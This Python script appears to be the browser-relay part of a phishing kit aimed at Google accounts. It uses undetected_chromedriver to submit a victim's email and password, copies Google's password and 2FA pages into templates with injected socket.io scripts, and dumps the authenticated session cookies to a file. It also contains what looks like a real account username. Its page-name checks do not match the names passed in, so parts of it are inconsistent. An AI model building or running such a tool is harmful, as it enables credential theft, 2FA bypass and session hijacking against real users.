from undetected_chromedriver       import Chrome
from time                          import sleep
from selenium.webdriver.common.by  import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support    import expected_conditions as EC
import json
from regex_google import add_socketio_script_to_head, modify_button_and_add_script, fix_image_tag, remove_base_tag, add_scripts_to_body_start

class Google:
    def __init__(self) -> None:
        self.url    = 'https://accounts.google.com'
        self.driver = Chrome(use_subprocess=True); self.driver.get(self.url)
        self.time   = 30
    
    def inputMail(self, email):
        #sleep(2)
        WebDriverWait(self.driver, 60).until(EC.visibility_of_element_located((By.NAME, 'identifier'))).send_keys(f'{email}\n')

    def inputPwd(self, password):
        WebDriverWait(self.driver, 60).until(EC.visibility_of_element_located((By.NAME, 'Passwd'))).send_keys(f'{password}\n')

    def copy_page(self, page_name):
        sleep(5)
        page_source = self.driver.page_source
        with open(page_name, 'w') as f:
            f.write(page_source)
        if page_name == "templates/google-password.html":
            add_socketio_script_to_head(page_name)
            modify_button_and_add_script(page_name)
            fix_image_tag(page_name)
            remove_base_tag(page_name)
        elif page_name == "templates/google-2fa.html":
            add_scripts_to_body_start(page_name)

    def export_cookies(self):
        WebDriverWait(self.driver, 60).until(EC.url_matches("https://myaccount.google.com"))
        cookies = self.driver.get_cookies()
        with open('cookies.json', 'w') as file:
            json.dump(cookies, file)
        self.driver.quit()
                                                                

      
if __name__ == "__main__":
    #  ---------- EDIT ----------
    email = 'yoan.popov98' # replace email
    password = 'password' # replace password
    #  ---------- EDIT ----------                                                                                                                                                         
    
    google = Google()
    google.inputMail(email)
    google.copy_page("google-password.html")
    google.inputPwd(password)
    google.copy_page("google-2fa.html")
    google.export_cookies()
